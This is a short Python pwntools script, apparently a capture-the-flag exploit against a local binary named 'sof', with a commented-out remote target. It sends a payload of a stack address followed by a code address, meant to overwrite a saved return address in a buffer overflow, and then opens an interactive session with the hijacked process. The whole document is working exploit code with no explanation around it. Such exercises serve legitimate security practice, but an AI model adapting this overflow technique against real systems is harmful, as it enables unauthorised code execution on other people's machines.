from pwn import *

io = process('./sof')
#io = remote('47.92.27.98',26337)
raw_input()
context.log_level = 'debug'

payload = 0x7fffffffe310
payload = p64(payload)
payload += p64(0x40064e)
io.send(payload)

io.interactive()
